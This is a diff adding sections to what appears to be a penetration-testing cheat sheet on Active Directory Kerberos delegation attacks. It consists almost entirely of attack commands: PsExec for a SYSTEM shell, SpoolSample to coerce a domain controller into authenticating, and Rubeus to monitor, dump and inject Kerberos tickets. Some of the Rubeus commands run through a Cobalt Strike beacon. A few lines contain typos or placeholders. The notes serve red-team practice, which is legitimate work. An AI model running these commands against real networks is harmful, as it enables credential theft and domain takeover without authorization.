@@ -1,3 +1,24 @@
+### Unconstrained Delegation
+```
+PsExec64.exe -accepteula -s -i cmd.exe
+Rubeus.exe monitor /interval:1 /nowrap
+
+PsExec64.exe -accepteula -s -i cmd.exe
+SpoolSample.exe DC Current Workstation which is configured with Unconstrained Delegation
+SpoolSample.exe DC01.Activebreach.io John-activebreach.io
+Rubues.exe ptt /ticket:base64Her
+
+```
+
+### From From Beacon (Cobalt Strike)
+```
+execute-assembly C:\Users\Public\Rubeus.exe triage
+execute-assembly C:\Users\NyaMeeEain\Desktop\Tools\rubeus.exe triage
+execute-assembly C:\Users\NyaMeeEain\Desktop\Tools\rubeus.exe dump /luid:0x44e8a2a
+execute-assembly C:\Users\Public\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
+execute-assembly C:\Users\Public\Rubeus.exe ptt /ticket: /luid:0x239b995
+```
+
 ### Constrained Delegation
 
 ```
